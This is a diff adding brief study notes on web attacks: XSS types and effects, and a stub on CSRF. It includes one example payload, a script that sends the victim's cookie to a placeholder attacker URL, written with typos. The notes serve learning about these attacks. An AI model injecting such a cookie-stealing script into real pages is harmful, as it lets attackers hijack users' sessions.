@@ -1,0 +1,20 @@
+-XSS
+xss is a code injection attack which allows an attacker to execute malicious 
+javascript in another user's browser.
+directly user inputs means potential xss
+some malicious attacks:
+	cookie theft - access to victm's cookies (document.cookie)
+	keylogging - keyboard event listener (addEventListener)
+	Phishing - DOM manipulation
+example attack:
+<script>window.location='http://atacker/?cookie='+dockument.cookie
+this script navigates the user to a different URL , triggers an HTTP request to 
+the attacker's server. The url includes the victim's cookie as a parameter,
+an attacker cn extract it.
+persistent xss - originates from the website's database
+reflected xss - originates from the victim's request
+DOM-based xss - originates from the client side code
+-CSRF
+similar to xss, csrf allows an attacker to take arbitrary actions as the victim
+against a website
+
